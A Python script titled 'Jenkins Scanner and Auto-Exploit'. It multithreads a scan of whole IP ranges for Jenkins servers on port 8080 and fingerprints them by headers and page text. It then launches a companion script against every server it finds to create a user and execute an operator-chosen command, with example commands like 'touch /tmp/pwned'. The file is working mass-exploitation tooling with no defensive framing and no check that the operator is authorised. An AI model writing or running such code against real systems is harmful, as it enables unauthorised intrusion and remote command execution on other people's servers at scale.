#!/usr/bin/env python3
"""
JENKINS SCANNER AND AUTO-EXPLOIT
================================

Scans IP ranges for Jenkins instances on port 8080 and automatically
executes the user creation and command execution script.
"""

import socket
import threading
import subprocess
import argparse
import ipaddress
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional

class JenkinsScanner:
    def __init__(self, threads: int = 50, timeout: int = 3):
        self.threads = threads
        self.timeout = timeout
        self.found_targets = []
        self.lock = threading.Lock()

    def scan_port(self, ip: str, port: int = 8080) -> bool:
        """Scan a single IP for open port 8080"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def check_jenkins(self, ip: str, port: int = 8080) -> bool:
        """Check if the service on the port is actually Jenkins"""
        try:
            import requests
            response = requests.get(f"http://{ip}:{port}", 
                                  timeout=self.timeout, 
                                  verify=False,
                                  headers={'User-Agent': 'Mozilla/5.0'})
            
            # Look for Jenkins indicators in the response
            jenkins_indicators = [
                'jenkins',
                'x-jenkins',
                'hudson',
                'Jenkins-Agent',
                'Jenkins-Session'
            ]
            
            # Check headers
            for header, value in response.headers.items():
                if any(indicator.lower() in header.lower() or 
                      indicator.lower() in str(value).lower() 
                      for indicator in jenkins_indicators):
                    return True
            
            # Check response body
            if any(indicator.lower() in response.text.lower() 
                  for indicator in jenkins_indicators):
                return True
                
        except Exception as e:
            print(f"[DEBUG] Error checking Jenkins on {ip}:{port} - {e}")
            
        return False

    def scan_target(self, ip: str, port: int = 8080) -> Optional[str]:
        """Scan a single target and return IP if Jenkins is found"""
        try:
            if self.scan_port(ip, port):
                print(f"[+] Port {port} open on {ip}")
                
                # Verify it's actually Jenkins
                if self.check_jenkins(ip, port):
                    print(f"[+] Jenkins detected on {ip}:{port}")
                    with self.lock:
                        self.found_targets.append(ip)
                    return ip
                else:
                    print(f"[-] Port {port} open on {ip} but not Jenkins")
            
        except Exception as e:
            print(f"[!] Error scanning {ip}: {e}")
        
        return None

    def scan_range(self, ip_range: str, port: int = 8080) -> List[str]:
        """Scan an IP range for Jenkins instances"""
        print(f"[*] Scanning {ip_range} for Jenkins on port {port}")
        print(f"[*] Using {self.threads} threads with {self.timeout}s timeout")
        
        try:
            network = ipaddress.ip_network(ip_range, strict=False)
            targets = [str(ip) for ip in network.hosts()]
            
            if len(targets) == 0:
                # Handle single IP
                targets = [str(ipaddress.ip_address(ip_range))]
                
        except Exception as e:
            print(f"[!] Invalid IP range: {ip_range} - {e}")
            return []
        
        print(f"[*] Scanning {len(targets)} targets...")
        
        found_jenkins = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all scan tasks
            future_to_ip = {
                executor.submit(self.scan_target, ip, port): ip 
                for ip in targets
            }
            
            # Process completed tasks
            for future in as_completed(future_to_ip):
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    if result:
                        found_jenkins.append(result)
                except Exception as e:
                    print(f"[!] Error processing {ip}: {e}")
        
        return found_jenkins

    def execute_exploit(self, target_ip: str, command: str, port: int = 8080) -> bool:
        """Execute the Jenkins user creation and command execution script"""
        print(f"\n[*] Executing exploit against {target_ip}:{port}")
        print(f"[*] Command to execute: {command}")
        
        try:
            # Build the command to execute the Jenkins script
            script_path = "/workspaces/test/jenkins_user_add_exec.py"
            cmd = [
                "python3", script_path,
                "--host", target_ip,
                "--port", str(port),
                "--command", command
            ]
            
            print(f"[*] Running: {' '.join(cmd)}")
            
            # Execute the script
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            print(f"[*] Script exit code: {result.returncode}")
            
            if result.stdout:
                print(f"[*] Script output:")
                print("-" * 50)
                print(result.stdout)
                print("-" * 50)
            
            if result.stderr:
                print(f"[!] Script errors:")
                print(result.stderr)
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            print(f"[!] Script execution timed out for {target_ip}")
            return False
        except Exception as e:
            print(f"[!] Error executing script against {target_ip}: {e}")
            return False

def parse_ip_ranges(ip_input: str) -> List[str]:
    """Parse comma-separated IP ranges/addresses"""
    ranges = []
    for item in ip_input.split(','):
        item = item.strip()
        if item:
            ranges.append(item)
    return ranges

def main():
    parser = argparse.ArgumentParser(
        description='Jenkins Scanner and Auto-Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.0/24 "whoami"
  %(prog)s 192.168.1.100 "touch /tmp/pwned"
  %(prog)s 10.0.0.0/16 "id" -t 300
  %(prog)s 192.168.1.0/24 "uname -a" --threads 100 --timeout 5
        """
    )
    
    # Positional arguments
    parser.add_argument('target', 
                       help='Target IP range in CIDR format (e.g., 192.168.1.0/24 or single IP like 192.168.1.100)')
    parser.add_argument('command',
                       help='Command to execute on compromised Jenkins instances')
    
    # Optional arguments
    parser.add_argument('--port', '-p', type=int, default=8080,
                       help='Target port (default: 8080)')
    parser.add_argument('-t', '--threads', type=int, default=50,
                       help='Number of scanning threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=3,
                       help='Connection timeout in seconds (default: 3)')
    parser.add_argument('--scan-only', action='store_true',
                       help='Only scan for Jenkins instances, do not exploit')
    
    args = parser.parse_args()
    
    print("JENKINS SCANNER AND AUTO-EXPLOIT")
    print("=" * 40)
    print(f"Target: {args.target}")
    print(f"Command to execute: {args.command}")
    print(f"Target port: {args.port}")
    print(f"Threads: {args.threads}")
    print(f"Timeout: {args.timeout}s")
    print()
    
    # Parse target range
    ip_ranges = [args.target]
    
    print(f"[*] Target range: {args.target}")
    
    scanner = JenkinsScanner(threads=args.threads, timeout=args.timeout)
    all_jenkins_targets = []
    
    # Scanning phase
    print(f"\n[*] Starting scan phase...")
    start_time = time.time()
    
    found_targets = scanner.scan_range(args.target, args.port)
    all_jenkins_targets.extend(found_targets)
    
    scan_time = time.time() - start_time
    print(f"\n[*] Scan completed in {scan_time:.2f} seconds")
    print(f"[+] Found {len(all_jenkins_targets)} Jenkins instances:")
    for target in all_jenkins_targets:
        print(f"    - {target}:{args.port}")
    
    if args.scan_only:
        print(f"\n[*] Scan-only mode completed")
        return 0
    
    # Exploitation phase
    if all_jenkins_targets:
        print(f"\n[*] Starting exploitation phase...")
        successful_exploits = 0
        
        for target in all_jenkins_targets:
            try:
                if scanner.execute_exploit(target, args.command, args.port):
                    successful_exploits += 1
                    print(f"[+] Successfully exploited {target}")
                else:
                    print(f"[-] Failed to exploit {target}")
            except KeyboardInterrupt:
                print(f"\n[!] Interrupted by user")
                break
            except Exception as e:
                print(f"[!] Error exploiting {target}: {e}")
        
        print(f"\n[*] Exploitation completed")
        print(f"[+] Successfully exploited {successful_exploits}/{len(all_jenkins_targets)} targets")
        
    else:
        print(f"\n[-] No Jenkins instances found to exploit")
    
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)
